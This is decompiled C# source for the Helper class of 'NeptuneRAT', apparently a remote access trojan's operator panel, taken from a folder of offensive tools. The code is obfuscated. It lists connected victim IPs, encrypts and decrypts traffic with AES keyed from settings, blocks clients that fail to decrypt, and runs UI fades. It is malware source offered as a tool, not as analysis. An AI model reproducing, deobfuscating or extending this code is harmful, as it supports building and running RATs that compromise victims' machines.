// Decompiled with JetBrains decompiler
// Type: NeptuneRAT.Helper
// Assembly: NeptuneRAT Free Version V2, Version=2.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 48C579C5-C5A1-4244-9537-C19C9217B961
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Tools\NeptuneRAT\NeptuneRAT.7z\neptunerat.exe

using Microsoft.VisualBasic.CompilerServices;
using NeptuneRAT.My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

#nullable disable
namespace NeptuneRAT;

[StandardModule]
internal sealed class Helper
{
  public static object \u2694️MasonRAT\u270Cـــــٸﻼ\u060D\u0608\u060Eـ(string ip, bool mode)
  {
    try
    {
      ListViewItem listViewItem = new ListViewItem();
      listViewItem.Text = ip;
      if (mode)
      {
        listViewItem.SubItems.Add(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3866));
        listViewItem.ForeColor = Color.Lime;
        listViewItem.ImageIndex = 0;
      }
      if (!mode)
      {
        listViewItem.SubItems.Add(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3867));
        listViewItem.ForeColor = Color.Red;
        listViewItem.ImageIndex = 1;
      }
      listViewItem.SubItems.Add(DateTime.Now.ToLongTimeString());
      MyProject.\u2694️MasonRAT\u270C\u060Dطڞڛ\u060F\u060Dټـٽټ\u060Bطـﻋۨ\u060Dﻼ.Form1.\u2694️MasonRAT\u270C\u060D\u0608ڞۧ\u0609ؤ̍\u0609ـۨـحۭۏد̍ٸٻ\u060E\u060B.Items.Insert(0, listViewItem);
      MyProject.\u2694️MasonRAT\u270C\u060Dطڞڛ\u060F\u060Dټـٽټ\u060Bطـﻋۨ\u060Dﻼ.Form1.\u2694️MasonRAT\u270C\u060D\u0608ڞۧ\u0609ؤ̍\u0609ـۨـحۭۏد̍ٸٻ\u060E\u060B.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
    object obj;
    return obj;
  }

  public static byte[] \u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string s)
  {
    return Encoding.Default.GetBytes(s);
  }

  public static string \u2694️MasonRAT\u270C\u060B\u0608\u0609ـڜۡڣـ\u0608ـ؁(byte[] b)
  {
    return Encoding.Default.GetString(b);
  }

  public static string \u2694️MasonRAT\u270Cــٺــ\u0608ـ\u060Dٺ̍ڙـاۚ\u0609ژڝ(long byteCount)
  {
    string[] strArray1 = new string[((1851610026 ^ -1851610052) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + (1901927900 + (16200400 << 349496126) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 >> ((237671566 ^ 1700312139 >> 1028049906) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0 << 0];
    strArray1[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3868);
    strArray1[1] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3869);
    strArray1[(286620259 % 1828587701 - 286620011 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - ((-1207157973 ^ -1495779750) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 >> 1273801813 + (343512369 << 1786174191) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0) + 0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3870);
    strArray1[(1999544133 - 696230163 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - (-979398503 - 2079380593 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 | 173073957 - 693270405 % 604526471 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0) + 0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3871);
    strArray1[(-1132920329 - -491806686 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ -((897086211 > 864015729 ? 641113647 : 854818196) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0 - 0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3872);
    strArray1[((30 ^ 17) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ^ 60 - (1707849013 >> 1784632153) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1) >> 0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3873);
    strArray1[((-1314592649 ^ 1972803259 << 341831655) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ^ ((-1607503600 ^ 1822895031 << 21743918) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 | 548566183 + 1509736762 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0 >> 0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3874);
    string[] strArray2 = strArray1;
    if (byteCount == 0L)
      return \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3875) + strArray2[0];
    long a = Math.Abs(byteCount);
    int int32 = Convert.ToInt32(Math.Floor(Math.Log((double) a, 1024.0)));
    double num = Math.Round((double) a / Math.Pow(1024.0, (double) int32), 1);
    return ((double) Math.Sign(byteCount) * num).ToString() + strArray2[int32];
  }

  public static byte[] \u2694️MasonRAT\u270Cﻻۡ\u060Fڙﻼد\u0020ڝ\u0609\u0609ـ(byte[] input)
  {
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
    \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3876);
    byte[] numArray;
    try
    {
      rijndaelManaged.Key = cryptoServiceProvider.ComputeHash(Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Settings.\u2694️MasonRAT\u270C\u060B\u0608ـدبـ\u060Bــحم̍ٽـ\u0609ڙـڟ));
      rijndaelManaged.Mode = (CipherMode) ((192178888 - 192178813 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ^ -1876909374 - 1189651839 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 >> ((1234057211 ^ 3) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0) + 0);
      ICryptoTransform encryptor = rijndaelManaged.CreateEncryptor();
      byte[] inputBuffer = input;
      numArray = encryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      Debug.WriteLine(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3877) + exception.Message);
      ProjectData.ClearProjectError();
    }
    return numArray;
  }

  public static byte[] \u2694️MasonRAT\u270C\u060Aـٽـ\u060A\u060Bۙؤژــڙٽـټـڙ(byte[] input, Client C = null)
  {
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
    byte[] numArray;
    try
    {
      rijndaelManaged.Key = cryptoServiceProvider.ComputeHash(Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Settings.\u2694️MasonRAT\u270C\u060B\u0608ـدبـ\u060Bــحم̍ٽـ\u0609ڙـڟ));
      rijndaelManaged.Mode = (CipherMode) (((83294591 ^ ~207810566) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - -((1664843270 ^ (1772627746 | 1132950106)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0) + 0);
      ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor();
      byte[] inputBuffer = input;
      numArray = decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
      goto label_7;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      Debug.WriteLine(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 3878) + exception.Message);
      if (C.\u2694️MasonRAT\u270C\u060A\u060A\u060Bﯧڙﻻ\u0608ؤ\u0608\u060A)
      {
        if (!Settings.\u2694️MasonRAT\u270Cـ̨\u0609ءۧٻ̍ـ\u0608ْبـﻋ.Contains(C.\u2694️MasonRAT\u270Cدـ\u060Fּٻـﻼــــطۡـ\u0609ـء\u0609\u0609\u060A.ToString().Split((char) (2003121571 + -31798633 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 + (((1731871658 > 466615951 ? 548739349 : 731652465) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) << (-854730445 ^ -1384020220) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0 - 0))[0]))
        {
          Settings.\u2694️MasonRAT\u270Cـ̨\u0609ءۧٻ̍ـ\u0608ْبـﻋ.Add(C.\u2694️MasonRAT\u270Cدـ\u060Fּٻـﻼــــطۡـ\u0609ـء\u0609\u0609\u060A.ToString().Split((char) ((287601957 + (2101817777 << 1434219662) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - -((577719066 ^ 15) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0) ^ 0))[0]);
          C.\u2694️MasonRAT\u270Cـ\u0608ـּۡـڙـ\u0609ــٻ̍\u060Dبڜ\u0609\u0609ۡد();
          ProjectData.ClearProjectError();
          goto label_7;
        }
      }
      ProjectData.ClearProjectError();
    }
    numArray = (byte[]) null;
label_7:
    return numArray;
  }

  public static void \u2694️MasonRAT\u270Cۭۚ\u060B\u060Aﻻۡــ\u0608ة(Form o, int interval = 80 /*0x50*/)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    Helper.VB\u0024StateMachine_6_FadeIn stateMachine = new Helper.VB\u0024StateMachine_6_FadeIn();
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024VB\u0024Local_o = o;
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024VB\u0024Local_interval = interval;
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024State = (1908399110 - (1950938072 >> 1585371457) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ^ ~(1585178432 - 652248358 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1) << 0;
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024Builder = AsyncVoidMethodBuilder.Create();
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024Builder.Start<Helper.VB\u0024StateMachine_6_FadeIn>(ref stateMachine);
  }

  public static void \u2694️MasonRAT\u270Cـڙـ\u0609ٺﻼ̍ــۜ؁ٸڝـ\u0609ـ(Form o, int interval = 80 /*0x50*/)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    Helper.VB\u0024StateMachine_7_FadeInMain stateMachine = new Helper.VB\u0024StateMachine_7_FadeInMain();
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024VB\u0024Local_o = o;
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024VB\u0024Local_interval = interval;
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024State = -1305300601 - ~1008127607 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 - (1376613201 - 1215665854 % 1303335901 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 << (222583023 > 1358361177 ? 1356723305 : 1017542479) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0) >> 0;
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024Builder = AsyncVoidMethodBuilder.Create();
    // ISSUE: reference to a compiler-generated field
    stateMachine.\u0024Builder.Start<Helper.VB\u0024StateMachine_7_FadeInMain>(ref stateMachine);
  }
}
